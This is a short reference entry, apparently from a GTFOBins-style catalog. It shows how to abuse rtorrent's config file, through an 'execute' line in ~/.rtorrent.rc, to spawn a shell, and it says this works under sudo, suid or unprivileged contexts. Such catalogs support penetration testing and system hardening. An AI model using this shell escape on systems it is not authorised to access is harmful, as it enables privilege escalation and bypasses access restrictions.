---
type: gtfobin
name: rtorrent
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# rtorrent

## shell

```bash
echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```
_After the shell, exit with `Ctrl-Q`._
**Contexts:** sudo, suid, unprivileged
